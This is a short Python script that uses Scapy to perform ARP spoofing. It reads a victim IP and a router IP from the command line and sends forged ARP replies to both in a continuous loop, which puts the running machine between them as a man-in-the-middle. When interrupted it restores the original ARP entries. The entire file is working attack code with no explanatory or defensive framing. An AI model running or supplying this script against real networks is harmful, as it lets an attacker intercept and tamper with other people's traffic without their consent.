from scapy.all import *
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
	local_ip = str(get_if_addr("eth0"))
	local_mac = get_if_hwaddr("eth0")
	# print("local_ip " + local_ip)
	# print("local_mac " + local_mac)
	packet = ARP(op=2, hwsrc = local_mac, psrc = source_ip,
		hwdst = dest_mac, pdst = dest_ip)
	send(packet, verbose = False)	
	
def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
	packet = ARP(op=2, hwsrc = source_mac, psrc = source_ip, 
		hwdst = dest_mac, pdst = dest_ip)
	send(packet, verbose = False)
	
def main():
	victim_ip = sys.argv[1]
	router_ip = sys.argv[2]
	victim_mac = getmacbyip(victim_ip)
	router_mac = getmacbyip(router_ip)
	print("victim mac " + victim_mac)
	print("router_mac " + router_mac)
	
	try:
		print("Sending spoofed ARP packets")
		while True:
			arp_spoof(victim_ip, victim_mac, router_ip)
			arp_spoof(router_ip, router_mac, victim_ip)
	except KeyboardInterrupt:
		print("Restoring ARP tables")
		arp_restore(router_ip, router_mac, victim_ip, victim_mac)
		arp_restore(victim_ip, victim_mac, router_ip, router_mac)
		quit()
		
main()							
	
